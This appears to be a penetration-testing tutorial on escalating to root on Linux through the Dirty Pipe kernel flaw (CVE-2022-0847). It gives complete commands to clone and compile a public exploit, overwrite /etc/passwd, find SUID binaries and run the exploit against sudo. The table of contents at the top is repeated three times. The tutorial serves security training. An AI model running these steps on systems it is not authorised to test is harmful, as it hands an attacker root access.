## Table of Contents

  - [Table of Contents](#Table\of\Contents)
  - [Table of Contents](#Table\of\Contents)
      - [Download Dirty Pipe Exploit](#Download\Dirty\Pipe\Exploit)
      - [Verify Kernel Version](#Verify\Kernel\Version)
      - [Exploitation](#Exploitation)
      - [Exploitation](#Exploitation)

## Table of Contents

  - [Table of Contents](#Table\of\Contents)
      - [Download Dirty Pipe Exploit](#Download\Dirty\Pipe\Exploit)
      - [Verify Kernel Version](#Verify\Kernel\Version)
      - [Exploitation](#Exploitation)
      - [Exploitation](#Exploitation)

## Table of Contents

- [Download Dirty Pipe Exploit](#Download\Dirty\Pipe\Exploit)
      - [Verify Kernel Version](#Verify\Kernel\Version)
      - [Exploitation](#Exploitation)
      - [Exploitation](#Exploitation)

A vulnerability in the Linux kernel, named [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the [Dirty Cow](https://dirtycow.ninja/) vulnerability discovered in 2016. All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability.


In simple terms, this vulnerability allows a user to write to arbitrary files as long as he has read access to these files. It is also interesting to note that Android phones are also affected. Android apps run with user rights, so a malicious or compromised app could take over the phone.

This vulnerability is based on pipes. Pipes are a mechanism of unidirectional communication between processes that are particularly popular on Unix systems. For example, we could edit the `/etc/passwd` file and remove the password prompt for the root. This would allow us to log in with the `su` command without the password prompt.

To exploit this vulnerability, we need to download a [PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) and compile it on the target system itself or a copy we have made.

#### Download Dirty Pipe Exploit

```shell
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

After compiling the code, we have two different exploits available. The first exploit version (`exploit-1`) modifies the `/etc/passwd` and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit.

#### Verify Kernel Version
```bash
uname -r 
```

#### Exploitation
```shell
cry0l1t3@nix02:~$ ./exploit-1
```

With the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:

```bash
find / -perm -4000 2>/dev/null
```

Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.

#### Exploitation

```shell
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo
```



